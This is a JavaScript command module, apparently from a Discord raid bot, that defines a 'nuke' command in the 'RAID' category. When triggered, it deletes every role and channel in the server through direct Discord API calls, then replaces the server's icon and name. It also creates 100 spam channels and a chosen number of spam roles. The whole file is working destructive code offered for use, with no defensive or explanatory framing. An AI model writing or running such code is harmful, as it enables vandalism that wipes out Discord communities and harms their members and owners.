const axios = require("axios");
const config = require('../../config.json');
const uagent = config.uagent;
const token = config.token;
const Sname = config.Sname;

const headers = {'User-Agent': uagent, 'Authorization': token }

async function channelS(guild){
  axios
  .post(`https://discord.com/api/v8/guilds/${guild}/channels`, {
    name: config.Cname,
},{
    headers
})

  .then(res => {
    console.log("Channel Spammed");
  })
  .catch(error => {
    console.error("Error");
  });
}

async function channelD(channel){
  axios
  .delete(`https://discord.com/api/v8/channels/${channel}`,{
    headers
})

  .then(res => {
    console.log("Channel Deleted");
  })
  .catch(error => {
    console.error("Error");
  });
}

async function roleD(guild,role){
  axios
  .delete(`https://discord.com/api/v8/guilds/${guild}/roles/${role}`,{
    headers
})

  .then(res => {
    console.log("Role Deleted");
  })
  .catch(error => {
    console.error("Error");
  });
}

async function roleS(guild){
  axios
  .post(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    name: config.Cname
},{
    headers
})

  .then(res => {
    console.log("Role Spammed");
  })
  .catch(error => {
    console.error("Error");
  });
}


module.exports = {
  name: "nuke",
  category: "RAID",
  description: "Nukes the server",
  usage: "<Your Prefix>nuke",
  run: async (dortrox, message, args) => {
    message.delete();
    message.guild.roles.cache.forEach(role => {
        roleD(message.guild.id, role.id)
    });

    message.guild.channels.cache.forEach(channel => {
        channelD(channel.id)
    });

    message.guild.setIcon("https://images-ext-2.discordapp.net/external/f_sDhdP9vPA7bLDQQCshxmr9bGYlBbhh_QipTieKp3o/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/853177489743282217/537e58a200caaff7f674569e403776e6.png?width=660&height=660")

    message.guild.setName(Sname)

    for (let i = 0; i < 100; i++){
    channelS(message.guild.id);
    }

    for (let i = 0; i < args[0]; i++){
        roleS(message.guild.id);
        }
  },
};
